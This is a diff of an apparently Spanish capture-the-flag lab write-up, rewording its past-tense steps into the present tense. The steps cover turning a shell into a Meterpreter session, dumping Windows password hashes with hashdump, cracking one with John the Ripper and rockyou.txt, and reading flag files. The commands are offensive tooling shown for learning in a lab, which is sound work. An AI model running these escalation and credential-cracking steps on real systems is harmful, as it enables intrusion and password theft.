@@ -314,32 +314,33 @@
 </span></span></code></pre></div><h2 id="task-3---escalamiento-de-privilegios">Task 3 - Escalamiento de Privilegios</h2>
 <h3 id="paso-4-escalamiento-de-privilegios">Paso 4: Escalamiento de Privilegios</h3>
 <ul>
-<li>Exploré cómo aumentar mis privilegios y convertir mi shell en una sesión de Meterpreter.</li>
-<li>Utilicé el módulo &ldquo;shell_to_meterpreter&rdquo; de Metasploit para lograrlo.</li>
+<li>Busco la manera de escalar privilegios y convertir la shell en una sesión de Meterpreter.</li>
+<li>Utilizo el módulo &ldquo;shell_to_meterpreter&rdquo; de Metasploit para lograrlo.</li>
 </ul>
 <p>Comandos Metasploit:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use post/multi/manage/shell_to_meterpreter
+</span></span><span style="display:flex;"><span>sessions
 </span></span><span style="display:flex;"><span>set SESSION &lt;número de sesión&gt;
 </span></span><span style="display:flex;"><span>exploit
 </span></span></code></pre></div><h2 id="task-4---descifrando-contraseñas">Task 4 - Descifrando Contraseñas</h2>
 <h3 id="paso-5-extracción-de-contraseñas">Paso 5: Extracción de Contraseñas</h3>
 <ul>
-<li>Con Meterpreter, ejecuté el comando &ldquo;hashdump&rdquo; para extraer las contraseñas almacenadas en el sistema.</li>
+<li>Con Meterpreter, ejecuto el comando &ldquo;hashdump&rdquo; para extraer las contraseñas almacenadas en el sistema.</li>
 </ul>
 <p>Comando Meterpreter:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashdump
 </span></span></code></pre></div><h3 id="paso-6-descifrando-contraseña">Paso 6: Descifrando Contraseña</h3>
 <ul>
-<li>Copié el hash de contraseña de un usuario no predeterminado y utilicé John the Ripper para descifrarlo.</li>
-<li>La contraseña descifrada resultante fue &ldquo;alqfna22&rdquo;.</li>
+<li>Copio el hash de contraseña de un usuario no predeterminado y utilizo John the Ripper para descifrarlo.</li>
+<li>La contraseña descifrada resultante es &ldquo;alqfna22&rdquo;.</li>
 </ul>
 <p>Comandos John the Ripper:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hashdump.txt --format<span style="color:#f92672">=</span>NT
 </span></span></code></pre></div><h2 id="task-5---búsqueda-de-banderas">Task 5 - Búsqueda de Banderas</h2>
 <h3 id="paso-7-búsqueda-de-banderas">Paso 7: Búsqueda de Banderas</h3>
 <ul>
-<li>Utilicé el comando &ldquo;search&rdquo; en Meterpreter para encontrar las ubicaciones de las banderas en el sistema.</li>
-<li>Descubrí las siguientes banderas:
+<li>Utilizo el comando &ldquo;search&rdquo; en Meterpreter para encontrar las ubicaciones de las banderas en el sistema.</li>
+<li>Descubro las siguientes banderas:
 <ul>
 <li><code>c:\\flag1.txt</code> (ubicada en la raíz del sistema)</li>
 <li><code>c:\\Windows\\System32\\config\\flag2.txt</code> (ubicada en la carpeta de configuración)</li>
@@ -351,7 +352,7 @@
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>search -f flag*.txt
 </span></span></code></pre></div><h3 id="paso-8-exploración-de-banderas">Paso 8: Exploración de Banderas</h3>
 <ul>
-<li>Usé comandos como &ldquo;cat&rdquo; para mostrar el contenido de las banderas y encontrar las respuestas a las preguntas planteadas.</li>
+<li>Uso &ldquo;cat&rdquo; para mostrar el contenido de las banderas y encontrar las respuestas a las preguntas de la sala:</li>
 </ul>
 <p>Comando Meterpreter:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat c:<span style="color:#ae81ff">\\</span>flag1.txt
